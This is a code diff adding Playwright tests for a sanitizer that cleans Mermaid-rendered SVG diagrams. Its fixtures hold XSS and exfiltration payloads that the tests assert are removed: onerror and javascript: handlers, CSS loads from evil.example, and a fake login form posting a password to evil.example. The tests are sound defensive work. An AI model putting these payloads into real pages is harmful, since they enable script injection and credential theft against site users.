@@ -1,6 +1,6 @@
 import { test, expect } from "@playwright/test";
 import { JSDOM } from "jsdom";
-import { inertCss, sanitizeCompiledSvg } from "@/lib/svg-sanitize";
+import { inertCss, sanitizeCompiledSvg, sanitizeRenderedSvg } from "@/lib/svg-sanitize";
 
 // sanitizeCompiledSvg uses the browser's DOMParser/XMLSerializer — it only
 // ever runs client-side, after a dynamic ssr:false import in
@@ -118,5 +118,43 @@ test.describe("sanitizeCompiledSvg", () => {
 
   test("returns empty string when the root element isn't <svg>", () => {
     expect(sanitizeCompiledSvg("<div>not an svg</div>")).toBe("");
+  });
+});
+
+test.describe("sanitizeRenderedSvg (Mermaid on the page)", () => {
+  // What Mermaid hands back: HTML serialisation, labels in <foreignObject>, unclosed <br>.
+  const mermaid = (extra = "", style = ".node rect{fill:#eee}") =>
+    `<svg id="m1" ${SVG_NS} viewBox="0 0 100 50"><style>${style}</style><g class="node"><rect width="80" height="30"></rect>` +
+    `<foreignObject width="80" height="30"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">Deploy<br>to prod</span>${extra}</div></foreignObject></g></svg>`;
+
+  test("keeps the diagram and its HTML labels, unclosed <br> and all", () => {
+    const root = sanitizeRenderedSvg(mermaid());
+    expect(root?.nodeName.toLowerCase()).toBe("svg");
+    expect(root?.querySelector("foreignObject .nodeLabel")?.textContent).toBe("Deployto prod");
+    expect(root?.querySelector("rect")).not.toBeNull();
+  });
+
+  test("themeCSS cannot load from another host", () => {
+    const root = sanitizeRenderedSvg(mermaid("", '.x{background:url(https://evil.example/b.png)} @import "https://evil.example/a.css"; .y{fill:url(#g)}'));
+    const css = root?.querySelector("style")?.textContent ?? "";
+    expect(css).not.toContain("evil.example");
+    expect(css).toContain("url(#g)");
+  });
+
+  test("handlers, script links and form controls inside a label are removed", () => {
+    const root = sanitizeRenderedSvg(
+      mermaid('<img src="x" onerror="alert(1)"><a href="javascript:alert(1)">x</a><form action="https://evil.example/steal"><input name="password"><button>Sign in</button></form><iframe src="https://evil.example"></iframe>'),
+    );
+    const html = root?.outerHTML ?? "";
+    for (const gone of ["onerror", "javascript:", "<form", "<input", "<button", "<iframe", "evil.example"]) {
+      expect(html, gone).not.toContain(gone);
+    }
+    expect(root?.querySelector(".nodeLabel")).not.toBeNull();
+  });
+
+  test("anything that is not exactly one <svg> is refused", () => {
+    expect(sanitizeRenderedSvg("<div>not a diagram</div>")).toBeNull();
+    expect(sanitizeRenderedSvg(`${mermaid()}<script>alert(1)</script>`)).toBeNull();
+    expect(sanitizeRenderedSvg("")).toBeNull();
   });
 });
